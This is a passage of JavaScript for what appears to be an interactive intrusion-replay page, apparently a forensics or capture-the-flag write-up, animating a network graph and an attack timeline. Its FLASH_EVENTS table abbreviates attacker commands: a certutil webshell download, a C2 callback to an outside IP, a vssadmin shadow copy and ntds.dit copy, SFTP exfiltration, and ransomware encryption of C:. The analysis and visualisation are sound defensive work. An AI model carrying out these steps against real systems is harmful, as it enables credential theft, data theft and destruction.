      acceptNode: node => (node.nodeValue && node.nodeValue.length > 2 && !shouldSkip(node.parentNode))
        ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_REJECT
    });
    const targets = [];
    let n;
    while ((n = walker.nextNode())) targets.push(n);
    for (const textNode of targets) {
      let src = textNode.nodeValue;
      let hit = false;
      for (const p of PATTERNS) { if (p.rx.test(src)) { hit = true; break; } PATTERNS.forEach(q => q.rx.lastIndex = 0); }
      if (!hit) continue;

      // Build replacement as a document fragment
      const frag = document.createDocumentFragment();
      let last = 0;
      // Combine all pattern matches and sort by index
      const matches = [];
      for (const p of PATTERNS) {
        p.rx.lastIndex = 0;
        let m;
        while ((m = p.rx.exec(src)) !== null) {
          matches.push({ start: m.index, end: m.index + m[0].length, text: m[0], group1: m[1], href: p.href(m, m[1]) });
        }
      }
      matches.sort((a,b) => a.start - b.start);
      // Drop overlapping
      const clean = [];
      let cur = -1;
      for (const m of matches) { if (m.start >= cur) { clean.push(m); cur = m.end; } }
      if (!clean.length) continue;

      for (const m of clean) {
        if (m.start > last) frag.appendChild(document.createTextNode(src.slice(last, m.start)));
        const a = document.createElement('a');
        a.className = 'xref';
        a.href = m.href;
        a.textContent = m.text;
        frag.appendChild(a);
        last = m.end;
      }
      if (last < src.length) frag.appendChild(document.createTextNode(src.slice(last)));
      textNode.parentNode.replaceChild(frag, textNode);
    }
  }

  // Run after the DOM is ready (this script is at end of body, so it is)
  walk(document.body);
})();

/* ====================================================== */
/*          CHAPTER NAV SCROLLSPY                         */
/* ====================================================== */
(function chapterSpy() {
  const nav = document.getElementById('chapterNav');
  const toggle = document.getElementById('chapterNavToggle');
  const list = document.getElementById('chapterNavList');
  const backdrop = document.getElementById('chapterNavBackdrop');
  const links = document.querySelectorAll('.chapter-nav-list a');
  const targets = [...links].map(a => document.querySelector(a.getAttribute('href'))).filter(Boolean);

  function setOpen(open) {
    nav.classList.toggle('open', open);
    if (backdrop) backdrop.classList.toggle('open', open);
    toggle.setAttribute('aria-expanded', open ? 'true' : 'false');
  }
  if (toggle) toggle.addEventListener('click', e => { e.stopPropagation(); setOpen(!nav.classList.contains('open')); });
  // Close when a chapter link is clicked (let the jump run first)
  links.forEach(a => a.addEventListener('click', () => setOpen(false)));
  // Click on the backdrop closes the drawer
  if (backdrop) backdrop.addEventListener('click', () => setOpen(false));
  // Close on outside click (also caught by backdrop above, but kept for safety when backdrop isn't covering)
  document.addEventListener('click', e => { if (nav.classList.contains('open') && !nav.contains(e.target) && e.target !== backdrop) setOpen(false); });
  // Close on Escape
  document.addEventListener('keydown', e => { if (e.key === 'Escape') setOpen(false); });

  function update() {
    const y = window.scrollY + window.innerHeight * 0.35;
    let current = targets[0];
    for (const t of targets) if (t && t.offsetTop <= y) current = t;
    links.forEach(a => a.classList.toggle('active', current && ('#'+current.id) === a.getAttribute('href')));
  }
  window.addEventListener('scroll', update, { passive: true });
  update();
})();

/* ====================================================== */
/*          CINEMATIC GRAPH · ICONS + TRAILS + FLASHES    */
/* ====================================================== */

// SVG icon content per host type (24x24 viewBox, inherits stroke from parent)
const HOST_ICONS = {
  OP:    '<path d="M12 3 L6 9 L6 14 L4 21 L20 21 L18 14 L18 9 Z"/><path d="M9 9 L15 9 L14 13 L10 13 Z" fill="currentColor" fill-opacity=".2" stroke="none"/><circle cx="10" cy="11" r=".8" fill="currentColor" stroke="none"/><circle cx="14" cy="11" r=".8" fill="currentColor" stroke="none"/>',
  TOOL:  '<rect x="4" y="11" width="16" height="9" rx="1"/><circle cx="7" cy="15.5" r=".8" fill="currentColor" stroke="none"/><line x1="10" y1="15.5" x2="17" y2="15.5" stroke-opacity=".5"/><line x1="12" y1="11" x2="12" y2="3"/><path d="M9 5 Q12 2 15 5"/><path d="M10 7 Q12 5 14 7" stroke-opacity=".7"/>',
  SINK:  '<rect x="3" y="5" width="14" height="14" rx="1"/><line x1="7" y1="12" x2="21" y2="12"/><path d="M17 8 L21 12 L17 16"/>',
  IIS:   '<circle cx="12" cy="12" r="8"/><ellipse cx="12" cy="12" rx="8" ry="3.2"/><line x1="4" y1="12" x2="20" y2="12"/><path d="M12 4 C 8 8 8 16 12 20"/><path d="M12 4 C 16 8 16 16 12 20"/>',
  SVR01: '<rect x="4" y="4" width="16" height="16" rx="1"/><line x1="4" y1="10" x2="20" y2="10"/><line x1="4" y1="15" x2="20" y2="15"/><circle cx="7" cy="7" r=".6" fill="currentColor" stroke="none"/><circle cx="7" cy="12.5" r=".6" fill="currentColor" stroke="none"/><circle cx="7" cy="17.5" r=".6" fill="currentColor" stroke="none"/><line x1="10" y1="7" x2="17" y2="7" stroke-opacity=".4"/><line x1="10" y1="12.5" x2="17" y2="12.5" stroke-opacity=".4"/><line x1="10" y1="17.5" x2="17" y2="17.5" stroke-opacity=".4"/>',
  DC01:  '<rect x="6" y="3" width="12" height="14"/><line x1="6" y1="7" x2="18" y2="7" stroke-opacity=".5"/><line x1="6" y1="11" x2="18" y2="11" stroke-opacity=".5"/><circle cx="9" cy="5" r=".6" fill="currentColor" stroke="none"/><path d="M12 13 L9 15 L9 19 Q12 21 15 19 L15 15 Z" fill="currentColor" fill-opacity=".2"/>',
  DC02:  '<rect x="6" y="3" width="12" height="14"/><line x1="6" y1="7" x2="18" y2="7" stroke-opacity=".5"/><line x1="6" y1="11" x2="18" y2="11" stroke-opacity=".5"/><circle cx="9" cy="5" r=".6" fill="currentColor" stroke="none"/><path d="M12 13 L9 15 L9 19 Q12 21 15 19 L15 15 Z" fill="currentColor" fill-opacity=".2"/>',
  WS01:  '<rect x="2" y="4" width="20" height="13" rx="1"/><line x1="10" y1="21" x2="14" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/><rect x="5" y="7" width="14" height="7" fill="currentColor" fill-opacity=".2" stroke="none"/>',
  WS02:  '<rect x="2" y="4" width="20" height="13" rx="1"/><line x1="10" y1="21" x2="14" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/><rect x="5" y="7" width="14" height="7" fill="currentColor" fill-opacity=".2" stroke="none"/>',
  ROLE:  '<path d="M7 16 Q3 16 3 12 Q3 8 7 8 Q7 5 11 5 Q15 5 15 8 Q19 8 19 12 Q19 16 15 16 Z"/><circle cx="10" cy="12" r="1.3"/><line x1="11.3" y1="12" x2="16" y2="12"/><line x1="14" y1="12" x2="14" y2="14"/><line x1="16" y1="12" x2="16" y2="14"/>',
  S3:    '<path d="M5 5 L19 5 L17.5 20 L6.5 20 Z"/><line x1="5" y1="5" x2="19" y2="5"/><line x1="6" y1="10" x2="18" y2="10" stroke-opacity=".5"/><line x1="6" y1="15" x2="18" y2="15" stroke-opacity=".5"/><path d="M9 5 Q9 3 12 3 Q15 3 15 5" stroke-opacity=".5"/>',
};

// Host geometry for positioning command flashes in DOM space
const HOST_POS = {
  OP:    { x:  80, y: 130, w: 170, h: 62 },
  TOOL:  { x:  80, y: 230, w: 170, h: 62 },
  SINK:  { x:  80, y: 580, w: 170, h: 62 },
  IIS:   { x: 340, y: 155, w: 160, h: 72 },
  SVR01: { x: 550, y: 290, w: 160, h: 72 },
  DC01:  { x: 760, y: 155, w: 150, h: 72 },
  DC02:  { x: 760, y:  70, w: 150, h: 62 },
  WS02:  { x: 550, y: 410, w: 160, h: 62 },
  WS01:  { x: 760, y: 410, w: 150, h: 62 },
  ROLE:  { x: 970, y: 155, w: 180, h: 72 },
  S3:    { x: 970, y: 290, w: 180, h: 62 },
};

function injectNodeIcons() {
  document.querySelectorAll('.host-clickable').forEach(g => {
    const host = g.dataset.host;
    const body = HOST_ICONS[host];
    if (!body) return;
    const rect = g.querySelector('rect.nd');
    if (!rect) return;
    const w = parseFloat(rect.getAttribute('width'));
    const iconSize = 22;
    const iconX = w - iconSize - 10;
    const iconY = 8;
    const wrap = document.createElementNS('http://www.w3.org/2000/svg','g');
    wrap.setAttribute('class','node-icon');
    wrap.setAttribute('transform', `translate(${iconX}, ${iconY}) scale(${iconSize/24})`);
    wrap.setAttribute('stroke','currentColor');
    wrap.setAttribute('fill','none');
    wrap.setAttribute('stroke-width','1.5');
    wrap.setAttribute('stroke-linecap','round');
    wrap.setAttribute('stroke-linejoin','round');
    wrap.innerHTML = body;
    g.insertBefore(wrap, rect.nextSibling);
  });
}

function injectEdgeTrails() {
  document.querySelectorAll('.edge-g').forEach(g => {
    // avoid double injection
    if (g.querySelector('.edge-trail')) return;
    const mainPath = g.querySelector('path.edge');
    if (!mainPath) return;
    const d = mainPath.getAttribute('d');
    let color = 'g';
    ['r','a','g','c','v'].forEach(c => { if (mainPath.classList.contains(c)) color = c; });
    const trail = document.createElementNS('http://www.w3.org/2000/svg','path');
    trail.setAttribute('class', `edge-trail ${color}`);
    trail.setAttribute('d', d);
    g.insertBefore(trail, mainPath);
  });
}

injectNodeIcons();
injectEdgeTrails();

/* ====================================================== */
/*          CINEMATIC UPGRADES · packet + detonate + chain */
/* ====================================================== */

// Node center positions in SVG coords (1200x720 viewBox)
const NODE_CENTER = {
  OP:    [165, 161], TOOL:  [165, 261], SINK:  [165, 611],
  IIS:   [420, 191], SVR01: [630, 326], DC01:  [835, 191],
  DC02:  [835, 101], WS02:  [630, 441], WS01:  [835, 441],
  ROLE:  [1060, 191], S3:   [1060, 321],
};

// Packet travels from source → target along a curved path using simple linear interp
const replayPacket = document.getElementById('replayPacket');
let packetInterval = null;
function animatePacket(from, to, lane) {
  if (!replayPacket || !from || !to) return;
  const p1 = NODE_CENTER[from], p2 = NODE_CENTER[to];
  if (!p1 || !p2) return;
  const [x1,y1] = p1, [x2,y2] = p2;
  clearInterval(packetInterval);
  replayPacket.setAttribute('cx', x1);
  replayPacket.setAttribute('cy', y1);
  replayPacket.setAttribute('class','replay-packet ' + (lane || 'r'));
  replayPacket.classList.add('travel');
  let step = 0;
  const steps = 28;
  packetInterval = setInterval(() => {
    step++;
    const t = step / steps;
    // slight arc: lift midpoint by 20% of distance
    const mx = (x1+x2)/2, my = (y1+y2)/2 - Math.abs(x2-x1)*0.1;
    const bx = (1-t)*(1-t)*x1 + 2*(1-t)*t*mx + t*t*x2;
    const by = (1-t)*(1-t)*y1 + 2*(1-t)*t*my + t*t*y2;
    replayPacket.setAttribute('cx', bx);
    replayPacket.setAttribute('cy', by);
    if (step >= steps) {
      clearInterval(packetInterval);
      setTimeout(() => replayPacket.classList.remove('travel'), 250);
    }
  }, 900 / steps);
}

// Detonation wash + screen shock — only fires on the ransomware impact moment
const graphDetonate = document.getElementById('graphDetonate');
const graphShock    = document.getElementById('graphShock');
function triggerDetonate() {
  if (!graphDetonate || !graphShock) return;
  graphDetonate.classList.remove('show');
  graphShock.classList.remove('show');
  void graphDetonate.offsetWidth; void graphShock.offsetWidth;
  graphDetonate.classList.add('show');
  graphShock.classList.add('show');
  setTimeout(() => { graphDetonate.classList.remove('show'); graphShock.classList.remove('show'); }, 2400);
}

// Serif italic "Act X · tagline" banner drops in when a new act begins
const graphActBanner = document.getElementById('graphActBanner');
const ACT_TAGLINES = {
  I:   { title: 'Act I',   line: 'The query string lands',          sub: 'INGRESS · 18:51 → 19:38 UTC' },
  II:  { title: 'Act II',  line: 'The crown jewel',                 sub: 'NTDS EXFIL · 20:02 → 20:09 UTC' },
  III: { title: 'Act III', line: 'The pivot spreads',               sub: 'LATERAL + PTH · 20:13 → 21:08 UTC' },
  IV:  { title: 'Act IV',  line: 'Bytes leave the building',        sub: 'COLLECTION · 20:20 → 20:30 UTC' },
  VI:  { title: 'Act V',   line: 'The role walks out',              sub: 'CLOUD · 21:42 → 21:45 UTC' },
  V:   { title: 'Act VI',  line: 'Ninety seconds of impact',        sub: 'DETONATION · 21:58 → 22:10 UTC' },
};
let lastActShown = null;
function showActBanner(actId) {
  if (!graphActBanner) return;
  if (!actId || actId === lastActShown) return;
  const a = ACT_TAGLINES[actId];
  if (!a) return;
  lastActShown = actId;
  graphActBanner.innerHTML = `${a.title} · <em>${a.line}</em><span class="sub">${a.sub}</span>`;
  graphActBanner.classList.add('show');
  clearTimeout(graphActBanner._hideTimer);
  graphActBanner._hideTimer = setTimeout(() => graphActBanner.classList.remove('show'), 3400);
}

// Chain breadcrumbs · last 3 events → current, clickable
const ecChain = document.getElementById('ecChain');
function fmtDt(dt) {
  if (dt < 60) return dt + 's';
  if (dt < 3600) return Math.round(dt/60) + ' min';
  return (dt/3600).toFixed(1) + ' h';
}
function renderChain(idx) {
  if (!ecChain) return;
  if (idx < 0) {
    ecChain.classList.add('empty');
    ecChain.innerHTML = '<span class="chain-label">Chain</span>';
    return;
  }
  ecChain.classList.remove('empty');
  const prevN = Math.min(3, idx);
  const parts = ['<span class="chain-label">Chain</span>'];
  for (let i = idx - prevN; i <= idx; i++) {
    const ev = EVENTS[i];
    const hostLabel = (HOST_LABEL[ev.host] || ev.host);
    const color = HOST_COLOR[ev.host] || '';
    const cur = (i === idx) ? ' current' : '';
    parts.push(`<span class="crumb${cur}" data-idx="${i}"><span class="c-ts">${ev.t.slice(0,5)}</span><span class="c-host" data-c="${color}">${hostLabel}</span></span>`);
    if (i < idx) {
      const dt = EVENTS[i+1].sec - ev.sec;
      parts.push(`<span class="link">+${fmtDt(dt)}</span>`);
    }
  }
  ecChain.innerHTML = parts.join('');
  ecChain.querySelectorAll('.crumb').forEach(c => {
    c.addEventListener('click', () => setScrubber(EVENTS[+c.dataset.idx].sec));
  });
}

// Ransomed state — applied when a detonation event fires on a host
function markRansomed(host) {
  const n = document.querySelector(`.host-clickable[data-host="${host}"]`);
  if (n) n.classList.add('host-ransomed');
}
function clearRansomed() {
  document.querySelectorAll('.host-ransomed').forEach(n => n.classList.remove('host-ransomed'));
}

// Key-event → (from, lane) map for packet routing.
// Events WITH an edge get packet animation matching that edge's lane color.
const PACKET_ROUTES = {};
EVENTS.forEach(ev => {
  if (!ev.edge) return;
  const eg = document.getElementById(ev.edge);
  if (!eg) return;
  const p = eg.querySelector('path.edge');
  if (!p) return;
  let lane = 'r';
  ['r','a','g','c','v'].forEach(x => { if (p.classList.contains(x)) lane = x; });
  const from = eg.dataset.src;
  const to = eg.dataset.dst;
  PACKET_ROUTES[ev.t] = { from, to, lane };
});

// Hook into setScrubber wrapper — we already have a forward-only flasher;
// now extend it to also animate packet + trigger detonate + render chain + act banner.
// The existing wrapper is further down. We observe eventCard class changes via MutationObserver
// to catch every forward advance without rewriting the wrapper.
const _prevAdvance = currentEventIdx;
let _lastFiredIdx = -1;
(function hookAdvance() {
  // Rewire onto our own check loop via rAF polling — cheap, runs only while playing.
  function poll() {
    if (currentEventIdx !== _lastFiredIdx && currentEventIdx > _lastFiredIdx) {
      const ev = EVENTS[currentEventIdx];
      if (ev) {
        // Defensive event-card repaint — guarantees the description survives no
        // matter what else raced during setScrubber.
        if (ecDesc)    ecDesc.innerHTML = richDesc(ev.desc);
        if (ecTime)    ecTime.textContent = ev.t;
        if (ecElapsed) ecElapsed.textContent = fmtElapsed(ev.sec);
        if (ecHost) {
          ecHost.textContent = HOST_LABEL[ev.host] || ev.host;
          ecHost.dataset.hostColor = HOST_COLOR[ev.host] || '';
        }
        if (ecTags) {
          const tags = parseTags(ev.desc);
          const nxt  = EVENTS[currentEventIdx + 1];
          let tagHtml = tags.map(t => `<span class="ec-tag ${t.cls}">${t.text}</span>`).join('');
          if (nxt) {
            const dt = nxt.sec - ev.sec;
            const dtStr = dt < 60 ? `${dt}s` : dt < 3600 ? `${Math.round(dt/60)}m` : `${(dt/3600).toFixed(1)}h`;
            tagHtml += `<span class="ec-tag next">next in ${dtStr}</span>`;
          }
          ecTags.innerHTML = tagHtml;
        }
        if (eventNum) eventNum.textContent = currentEventIdx + 1;
        if (eventCard) {
          eventCard.classList.add('act-' + ev.act, 'fired');
          setTimeout(() => eventCard.classList.remove('fired'), 900);
        }
        // Packet animation if this event crosses a network edge
        const route = PACKET_ROUTES[ev.t];
        if (route && route.from && route.to) animatePacket(route.from, route.to, route.lane);
        // Chain breadcrumbs
        renderChain(currentEventIdx);
        // Act banner
        const act = currentAct(ev.sec);
        if (act) showActBanner(act.id);
        // Detonation + mark ransomed on the impact moment
        if (ev.t === '22:09:46') {
          triggerDetonate();
          markRansomed('WS01');
          markRansomed('WS02');
        }
      }
      _lastFiredIdx = currentEventIdx;
    }
    if (replaySec < 1) { _lastFiredIdx = -1; clearRansomed(); renderChain(-1); lastActShown = null; }
    requestAnimationFrame(poll);
  }
  requestAnimationFrame(poll);
})();

/* ----- Command flash overlay ----- */
const FLASH_EVENTS = {
  '18:51:41': { host:'IIS',   color:'cyan',   label:'WEBSHELL DROP',     cmd:'certutil -urlcache → <code>so.aspx</code>' },
  '19:38:02': { host:'IIS',   color:'amber',  label:'SYSTEM · C2 CALLBACK', cmd:'<code>SolarWinds.exe</code> (writable-ACL binary swap, executed on Donny reboot) · <b>OSS C2</b> → <code>173.230.136.180:8443</code>' },
  '19:59:00': { host:'WS01',  color:'violet', label:'ADMIN$ SERVICE EXEC', cmd:'<code>\\\\10.3.10.12\\ADMIN$\\rnSylwOz.exe</code>' },
  '20:08:53': { host:'DC01',  color:'red',    label:'IMPACKET --use-vss', cmd:'<code>vssadmin create shadow /For=C:</code>' },
  '20:09:03': { host:'DC01',  color:'red',    label:'NTDS COPIED',       cmd:'<code>cmd /C copy ntds.dit → ZIFylmKF.tmp</code>' },
  '20:30:26': { host:'SVR01', color:'amber',  label:'SFTP EXFIL',        cmd:'<code>data.cab → 172.236.127.251:22</code>' },
  '21:42:11': { host:'ROLE',  color:'green',  label:'IAM HIJACK',        cmd:'<b>STS</b> from off-instance · <code>sts:GetCallerIdentity</code>' },
  '22:09:46': { host:'WS01',  color:'red',    label:'DETONATION',        cmd:'<code>IamBatman.exe encrypt C:\\</code>', impact:true },
};

const graphWrap = document.querySelector('#sec-graph .graph-wrap');

function svgToDOM(xs, ys) {
  const svg = document.querySelector('#sec-graph svg');
  if (!svg || !graphWrap) return null;
  const sr = svg.getBoundingClientRect();
  const wr = graphWrap.getBoundingClientRect();
  const sx = sr.width / 1200, sy = sr.height / 720;
  return {
    left: (sr.left - wr.left) + xs * sx,
    top:  (sr.top  - wr.top ) + ys * sy,
  };
}

function spawnFlash(ev) {
  if (!graphWrap) return;
  const pos = HOST_POS[ev.host];
  if (!pos) return;
  const cx = pos.x + pos.w / 2;
  const cy = pos.y - 12; // just above the node
  const dom = svgToDOM(cx, cy);
  if (!dom) return;

  if (ev.impact) {
    const banner = document.createElement('div');
    banner.className = 'impact-banner';
    banner.textContent = 'IamBatman · DETONATION';
    graphWrap.appendChild(banner);
    setTimeout(() => banner.remove(), 2400);
  }

  const flash = document.createElement('div');
  flash.className = 'cmd-flash ' + ev.color;
  flash.innerHTML = `<span class="cf-label">${ev.label}</span><span class="cf-cmd">${ev.cmd}</span>`;
  flash.style.left = dom.left + 'px';
  flash.style.top  = dom.top + 'px';
  graphWrap.appendChild(flash);
  setTimeout(() => flash.remove(), 2400);
}

/* ====================================================== */
/*          ANSWER LEDGER · filter + search                */
/* ====================================================== */
(function ledgerWire() {
  const pills = document.querySelectorAll('#ledgerPills button');
  const search = document.getElementById('ledgerSearch');
  const body = document.getElementById('ledgerBody');
  const showing = document.getElementById('ledgerShowing');
  if (!body || !pills.length) return;

  let activeFam = '';
  let query = '';

  function apply() {
    let visible = 0;
    body.querySelectorAll('tr').forEach(tr => {
      const famOk = !activeFam || tr.dataset.fam === activeFam;
      const qOk = !query || tr.textContent.toLowerCase().includes(query);
      const ok = famOk && qOk;
      tr.classList.toggle('ledger-hidden', !ok);
      if (ok) visible++;
    });
    if (showing) showing.textContent = visible;
  }

  pills.forEach(b => {
    b.addEventListener('click', () => {
      activeFam = b.dataset.fam || '';
      pills.forEach(x => x.classList.remove('active'));
      b.classList.add('active');
      apply();
    });
  });
  search.addEventListener('input', (e) => {
    query = e.target.value.toLowerCase().trim();
    apply();
  });
})();

// Hook into the replay engine: when event idx advances forward AND a flash rule
// matches the event's t, pop a flash. We patch applyEventsForTime's observer
// by wrapping setScrubber instead.
const _setScrubber = setScrubber;
let _flashLastIdx = -1;
window.setScrubber = function(sec) {
  const before = currentEventIdx;
  _setScrubber(sec);
  const after = currentEventIdx;
  if (after > before && after > _flashLastIdx) {
    const ev = EVENTS[after];
    const rule = ev && FLASH_EVENTS[ev.t];
    if (rule) spawnFlash(rule);
    _flashLastIdx = after;
  }
  if (sec < 1) _flashLastIdx = -1;
};
// Also catch the tick() path which calls setScrubber via closure — wrap it
setScrubber = window.setScrubber;
